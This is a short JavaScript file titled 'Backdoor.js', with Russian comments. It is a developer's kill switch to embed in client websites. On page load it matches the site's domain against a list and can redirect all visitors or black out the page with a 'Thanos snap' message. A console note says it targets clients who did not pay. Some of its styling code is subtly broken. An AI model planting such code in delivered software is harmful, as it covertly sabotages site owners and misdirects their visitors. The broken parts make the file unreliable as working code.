/*!
 * Backdoor.js v1.0.1
 * (c) 2024-2024
 * Made to protect against scammers.
 */

document.addEventListener("DOMContentLoaded", function() {
// Массив с сайтами и параметрами
const sites = [
  { url: "https://abros.me", date: "23/01/2024", effect: "none" },
  
];

// Массив с эффектами
const effects = {
  none: () => {
    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd");
  },
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  thanos: (startDate) => {
    console.log("Применяется эффект Thanos");
    const blackScreen = document.createElement("div");
  blackScreen.style.position = "fixed !important";
  blackScreen.style.top = "0 !important";
  blackScreen.style.left = "0 !important";
  blackScreen.style.width = "100% !important";
  blackScreen.style.height = "100% !important";
  blackScreen.style.background = "black !important";
  blackScreen.style.zIndex = "9999 !important";
  blackScreen.style.display = "flex !important";
  blackScreen.style.flexDirection = "column !important";
  blackScreen.style.alignItems = "center !important";
  blackScreen.style.justifyContent = "center !important";

  const gifImage = document.createElement("img");
  gifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  gifImage.alt = "Tanos Snap";
  gifImage.style.marginBottom = "20px !important";

  const caption = document.createElement("p");
  caption.style.color = "white !important";
  caption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  blackScreen.appendChild(gifImage);
  blackScreen.appendChild(caption);

  document.body.appendChild(blackScreen);
  }
};

// Функция для проверки домена
function checkDomain() {
  const currentDomain = window.location.hostname;

  // Проверка, есть ли текущий домен в списке
  const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);
  
  if (!siteInfo) {
    console.log("Made by Abros Studio → https://abros.me\nDaniel Abros → https://t.me/abrosxd");
  } else {
    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[siteInfo.effect];
    if (effectFunction) {
      effectFunction(siteInfo.redirecturl || siteInfo.date);
      console.log("Этот заказчик не оплатил мою работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nDaniel Abros → https://t.me/abrosxd");
    }
  }
}

// Вызов функции для проверки домена
checkDomain();
});
